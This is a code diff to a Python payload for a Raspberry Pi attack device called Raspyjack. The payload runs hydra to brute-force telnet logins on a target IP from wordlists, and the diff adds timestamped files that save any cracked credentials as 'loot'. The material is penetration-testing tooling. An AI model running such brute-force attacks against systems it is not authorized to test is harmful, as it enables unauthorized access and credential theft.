@@ -34,7 +34,14 @@ import subprocess
 import threading
 import re # For IP validation
 
-sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
+# Prefer /root/Raspyjack for imports; fallback to repo-relative
+RASPYJACK_ROOT = '/root/Raspyjack' if os.path.isdir('/root/Raspyjack') else os.path.abspath(os.path.join(__file__, '..', '..'))
+if RASPYJACK_ROOT not in sys.path:
+    sys.path.insert(0, RASPYJACK_ROOT)
+_wifi_dir = os.path.join(RASPYJACK_ROOT, 'wifi')
+if os.path.isdir(_wifi_dir) and _wifi_dir not in sys.path:
+    sys.path.insert(0, _wifi_dir)
+
 import RPi.GPIO as GPIO
 import LCD_Config
 import LCD_1in44
@@ -42,8 +49,6 @@ from PIL import Image, ImageDraw, ImageFont
 
 # WiFi Integration - Import dynamic interface support
 try:
-
-    sys.path.append('/root/Raspyjack/wifi/')
     from wifi.raspyjack_integration import get_best_interface
     WIFI_INTEGRATION_AVAILABLE = True
 except ImportError:
@@ -51,11 +56,23 @@ except ImportError:
     def get_best_interface():
         return "eth0" # Fallback
 
-RASPYJACK_DIR = os.path.abspath(os.path.join(__file__, '..', '..'))
 TARGET_IP = "192.168.1.22"
-USER_LIST = os.path.join(RASPYJACK_DIR, "wordlists", "telnet_users.txt")
-PASS_LIST = os.path.join(RASPYJACK_DIR, "wordlists", "telnet_pass.txt")
-LOOT_DIR = os.path.join(RASPYJACK_DIR, "loot", "Bruteforce")
+USER_LIST = os.path.join(RASPYJACK_ROOT, "wordlists", "telnet_users.txt")
+PASS_LIST = os.path.join(RASPYJACK_ROOT, "wordlists", "telnet_pass.txt")
+LOOT_DIR = os.path.join(RASPYJACK_ROOT, "loot", "attack_telnet_bruteforce")
+os.makedirs(LOOT_DIR, exist_ok=True)
+
+def save_loot_snapshot():
+    try:
+        ts = time.strftime('%Y-%m-%d_%H%M%S')
+        summary = os.path.join(LOOT_DIR, f"run_{ts}.txt")
+        with open(summary, 'w') as f:
+            f.write(f"Target: {TARGET_IP}\n")
+            f.write(f"Found creds: {found_creds or 'None'}\n")
+            f.write(f"Status: {status_msg}\n")
+            f.write(f"Timestamp: {ts}\n")
+    except Exception as e:
+        print(f"Loot save failed: {e}", file=sys.stderr)
 
 PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
 GPIO.setmode(GPIO.BCM)
@@ -78,8 +95,10 @@ NETWORK_INTERFACE = get_best_interface() # Dynamically get the best interface
 
 def cleanup(*_):
     global running
-    running = False
-    stop_attack_process() # Ensure hydra is terminated
+    if running:
+        running = False
+        stop_attack_process() # Ensure hydra is terminated
+        save_loot_snapshot()
 
 signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
@@ -204,8 +223,8 @@ def handle_ip_input():
 def run_attack(target_ip):
     global status_msg, found_creds, hydra_process
     
-    os.makedirs(LOOT_DIR, exist_ok=True)
-    output_file = os.path.join(LOOT_DIR, f"telnet_brute_{target_ip}.txt")
+    ts = time.strftime('%Y-%m-%d_%H%M%S')
+    output_file = os.path.join(LOOT_DIR, f"telnet_brute_{target_ip}_{ts}.txt")
     
     status_msg = f"Attacking {target_ip}..."
     draw_ui("main") # Update UI with status
@@ -225,6 +244,14 @@ def run_attack(target_ip):
                         password = parts[parts.index("password:")+1]
                         found_creds = f"{login}:{password}"
                         status_msg = "Credentials Found!"
+                        # Persist a simple summary snapshot
+                        try:
+                            with open(os.path.join(LOOT_DIR, f"summary_{target_ip}_{ts}.txt"), 'w') as sf:
+                                sf.write(f"Target: {target_ip}\n")
+                                sf.write(f"Creds: {found_creds}\n")
+                                sf.write(f"Timestamp: {ts}\n")
+                        except Exception as e:
+                            print(f"Failed to write summary: {e}", file=sys.stderr)
                         return
 
             status_msg = "No creds found."
@@ -285,10 +312,11 @@ if __name__ == "__main__":
         pass
     except Exception as e:
         print(f"[ERROR] {e}", file=sys.stderr)
-        draw_ui(message_lines=[f"CRITICAL ERROR:", f"{str(e)[:20]}"], color="red")
+        draw_ui(message_lines=[f"CRITICAL ERROR:", f"{str(e)[:20]}"])
         time.sleep(3)
     finally:
         stop_attack_process() # Ensure hydra is terminated on final exit
+        save_loot_snapshot()
         LCD.LCD_Clear()
         GPIO.cleanup()
         print("Telnet Brute-Force payload finished.")
